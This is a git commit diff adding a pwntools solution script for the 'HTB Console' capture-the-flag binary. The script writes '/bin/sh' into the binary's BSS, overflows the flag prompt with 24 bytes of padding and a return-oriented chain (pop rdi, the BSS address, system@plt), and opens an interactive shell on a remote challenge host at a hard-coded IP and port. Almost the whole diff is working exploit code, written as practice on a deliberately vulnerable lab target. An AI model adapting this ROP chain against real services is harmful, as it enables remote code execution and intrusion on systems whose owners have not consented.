1093ac2403f61d2989feb72f15986a970ad4982f
HanozDar <hanozd1234@gmail.com>
2021-11-13 09:10:16 -0500

    Completed my first proper ROP challenge, HTB Console

--- HTBConsole/htb-console-soln.py
+++ HTBConsole/htb-console-soln.py
@@ -3,11 +3,33 @@ import pwn
 
 # Read notes.txt honestly, there's too much in brain analysis and I've already got a segfault
 
-p = process("./htb-console")
+# The address of CALL SYSTEM is 0x00401381
+
+# The address of SYSTEM@PLT is 0x0000000000401040
+
+# The address of BSS where we write payload is 004040b0
+
+# Address of POP RDI is 0x0000000000401473
+
+#p = process("./htb-console")
+
+p = remote('157.245.44.97',30708) #157.245.44.97:30708
 
 ip1 = p.recv()
 print(ip1) # prints the welcome line
 
+# Write shellcode to bss
+command = b"hof"
+p.sendline(command)
+
+ip3 = p.recv()
+print(ip3)
+
+payload_test=b"/bin/sh"
+print(payload_test)
+p.sendline(payload_test)
+
+#Now we do buffer overflow
 command = b"flag"
 p.sendline(command)
 
@@ -15,11 +37,14 @@ ip2 = p.recv()
 print(ip2) #Prints enter flag line where we send the payload
 
 padding = b"A"*24
-ret_addr = b"\x42\x42\x42\x42\x42\x42"
-payload = padding + ret_addr
+ret_addr1 = pwn.p64(0x401473) #This is the pop rdi instruction
+ret_addr2 = pwn.p64(0x4040b0) #This is the location in BSS where it is going to execute shellcode
+ret_addr3 = pwn.p64(0x401040) #This is the call for system
+payload = padding + ret_addr1 + ret_addr2 + ret_addr3
 
 print(payload)
 p.sendline(payload)
 
+p.interactive()
 
 
